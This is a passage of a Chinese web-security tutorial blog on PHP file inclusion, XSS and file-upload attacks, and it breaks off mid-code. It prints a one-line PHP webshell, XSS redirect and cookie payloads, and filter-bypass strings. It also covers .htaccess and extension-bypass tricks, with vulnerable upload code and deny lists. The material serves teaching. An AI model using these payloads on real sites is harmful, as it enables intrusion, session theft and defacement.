class="line">注:base64编码<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span>的结果为PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==</span><br></pre></td></tr></table></figure><p>这样可以在网页直接执行编码的语句</p><h4 id="使用phar-伪协议执行压缩包中的恶意文件"><a href="#使用phar-伪协议执行压缩包中的恶意文件" class="headerlink" title="使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件"></a>使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件</h4><p>结合文件上传写一个一句话木马的文件shell_dir.php，将shell_dir.php压缩成shell_dir.zip，然后把压缩包重命名为shell_dir_zip.png<br>然后上传shell_dir_zip.png<br>那么结合?file&#x3D;phar:&#x2F;&#x2F;shell_dir_zip.png&#x2F;shell_dir.php这样的语句可以直接执行压缩包内的木马文件</p><p>而zip:&#x2F;&#x2F;伪协议作用一样,但需要改为?file&#x3D;zip:&#x2F;&#x2F;shell_dir_zip.png#shell_dir.php这样的格式</p><h2 id="XSS-跨站脚本"><a href="#XSS-跨站脚本" class="headerlink" title="XSS-跨站脚本"></a>XSS-跨站脚本</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>我们先从最简单的一种情况来引入XSS攻击<br>例如在127.0.0.1&#x2F;xss.php中存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么这样我们就能进行一个简单的注入,例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/xss.php?id=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么用户如果点击了类似于这样的攻击型网址,就会执行反射型XSS攻击,并造成危害,这也就是它作为反射型的原因,且只会执行一次</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>不同于反射型一般在url中进行注入,存储型一般会在博客评论，用户评论，留言板等等这些会把数据存储在数据库中的地方注入恶意代码</p><p>那么例如在某些留言板中,输入这样的代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么这条代码就被存在了本网站的数据库中,那么作为用户来访问此网页时,就自动的会被执行我们输入的命令,并且由于我们输入的评论(代码)存储在数据库中,所以不必和我们的评论进行交互而是直接会执行</p><h3 id="利用XSS造成危害"><a href="#利用XSS造成危害" class="headerlink" title="利用XSS造成危害"></a>利用XSS造成危害</h3><p>之前的例子中演示了XSS的原理,现在我们可以真正的去利用XSS漏洞来造成危害了,接下来举几个典型的例子</p><h4 id="劫持流量实现恶意跳转"><a href="#劫持流量实现恶意跳转" class="headerlink" title="劫持流量实现恶意跳转"></a>劫持流量实现恶意跳转</h4><p>想象一下,现在你看一个up很火非常不爽,想把它粉丝的流量引走,你可以怎么做呢?</p><p>依据之前的原理,我们可以在这个百万up主的评论中输入这样一段代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://Yantm666.github.io&quot;</span>&lt;script&gt;</span></span><br></pre></td></tr></table></figure><p>这样他的粉丝点进去直接就跳转到我的博客了,那么你也成功做到了让这位up失去粉丝的流量,甚至引流到我博客了哈哈(但是你可能需要在他的评论区抢个前排嘿嘿)</p><h4 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h4><p>用户登录成功后，一般把登录凭证存储在cookie中</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。</p><p>登录之后就可以尝试修改你的密码</p><p>我们可以通过这样的代码获取cookie值:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或使用js将cookie发送到特定的网站，通过XSS平台获取管理员cookie</p><h3 id="一些常见绕过"><a href="#一些常见绕过" class="headerlink" title="一些常见绕过"></a>一些常见绕过</h3><p>针对XSS攻击，网站一般会对用户输入进行过滤,那么我们可以进行一些常见的绕过</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只过滤了<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签,可以尝试<span class="tag">&lt;<span class="name">scRipt</span>&gt;</span>绕过</span></span></span><br></pre></td></tr></table></figure><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br></pre></td></tr></table></figure><p>因为将中间的script替换为空，剩下的结合后又是script可以成功绕过。</p><h4 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--加载svg图片时执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xxs link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--光标移动到xss link超链接上执行js代码&quot;alert(document.cookie)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--点击link超链接通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span> <span class="comment">&lt;!--通过故意引用不存在的图片触发onerror命令执行js代码&quot;alert(1)&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以不带分号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页中显示空格可以用&nbsp;<br>也可以用实体编码&#x20;</p><h4 id="内嵌tab"><a href="#内嵌tab" class="headerlink" title="内嵌tab"></a>内嵌tab</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">java&amp;#x09;script:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>防止javascrpt被过滤掉</p><h3 id="XSS平台获取cookie"><a href="#XSS平台获取cookie" class="headerlink" title="XSS平台获取cookie"></a>XSS平台获取cookie</h3><p><a href="https://blog.csdn.net/NSQ0207/article/details/131891269">https://blog.csdn.net/NSQ0207/article/details/131891269</a><br>可以参考这篇博客</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。</p><p>非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为WebShell，也可以称为一种网页后门</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>我们可以先从最简单但是很实用的一句话木马介绍起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ytm666&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么写个这样的php文件内容为一句话木马并上传到目标网站,就可以进行恶意操作</p><p>这样通过POST请求传给ytm666参数就可以执行任意php代码导致危害</p><p>例如执行system函数进行恶意操作,例如查看网页目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ytm666=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;dir&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么知道原理后我们就可以使用重量级的东西去远程连接webshell并进行不同的操作,例如利用蚁剑连接(其中添加数据时的密码就为POST请求的参数)</p><p>那么通过蚁剑可以查看网站的各种目录以及进行一系列操作</p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h4><p>如果客户端js脚本有加限制(如不允许上传.php后缀的文件),可以直接使用burpsuite发送请求,通过先改为合法后缀名后上传,再更改burpsuite抓到的数据包中后缀名使php文件生效后进行发包植入后门</p><p>当然也可以直接禁用浏览器js绕过</p><h4 id="服务端文件类型检查-服务端MIME类型验证"><a href="#服务端文件类型检查-服务端MIME类型验证" class="headerlink" title="服务端文件类型检查(服务端MIME类型验证)"></a>服务端文件类型检查(服务端MIME类型验证)</h4><p>MIME类型是描述消息内容类型的因特网标准,可以利用Burp抓包，将报文中的Content-Type改成允许的类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="comment">//取出文件上传后临时存储的文件名</span></span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false</span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如对于这道题的源码,我们就可以将其中修改<br><img src="https://img-blog.csdnimg.cn/20210522234227501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="1"></p><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><p>如果.php后缀被限制，可以尝试这些后缀（webshell内容一样）：.phtml、.pht、.php3、.php4、.php5(前提是apache的httpd.conf中有如下配置代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><hr><p>或者可以进行大小写绕过(<strong>后缀名大小写绕过原理</strong>：服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成PHP文件解析),例如对于这样的后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在这段代码中没有出现能使文件名转为小写的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这种情况下就可以考虑大小写绕过,比如上传后缀为pHP的文件</p><hr><p><strong>.phtml、.pht文件也可以这样写</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;ytm666&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以绕过对于过滤文件中”&lt;?”部分的题目,通过用js标签声明php语言使其中的php代码生效并进行绕过</p><hr><p>.php、.phtml等很多后缀都被限制，可以尝试上传.htaccess文件（只支持apache服务器）</p><p>上传后，所在目录中名字包含png的文件将被当作php代码解析。例如这样的.htaccess文件:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;png&quot;</span>&gt; setHander application/x-httpd-php &lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure><hr><p>有时我们遇到这样的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端将黑名单的后缀名替换为空,但仅进行一次,我们就可以尝试双写绕过,构造后缀名为.phphpp,那么后端替换php一次为空，则后缀就又为.php了</p><h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>对于这样的源码,如果绕过服务器文件文件头内容验证呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span 